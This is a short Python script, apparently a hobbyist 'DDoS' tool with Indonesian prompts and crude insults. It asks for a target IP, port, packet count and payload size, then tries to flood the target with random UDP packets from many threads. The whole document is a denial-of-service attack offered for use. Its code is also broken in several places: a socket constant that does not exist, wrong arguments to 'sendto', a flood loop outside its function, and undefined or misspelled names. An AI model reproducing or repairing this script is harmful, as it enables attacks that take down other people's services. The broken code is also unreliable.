import random
import socket
import threading
import os,sys

os.system("clear")
print("\033[91mDDDOS By LutT NO SHER")

P1 = str(input("\033[0mIP NYA SAYNAG: "))
P2 = int(input("\033[0mPORT NYA SAYNAG: "))
P3 = int(input("\033[0mPAKET NYA SAYANG: "))
P4 = int(input("\033[0mURANDOM NYA SAYANG: "))
os.system("clear")
def kontol():
    pe = random._urandom(P4)
    i = random.choice(("\033[91m[Attack By]","\033[91m{Attack by]","033[91m[Attck By]"))
while True: 
    try:
      s = socket.socket(socket.AF_INET,socket.SOCKET_DGRAM)
      pe2 = (str(P1),int(P2))
      for x in range(P3):
        s.sendto(P1,P2)
      print(i + "\033[94m ATTACK BY LUTT")
    except:
      print("\033[91mDOWN KONTOL")

for y in range(p3):
    th.threading.Thread(target = kontol)
    th.start()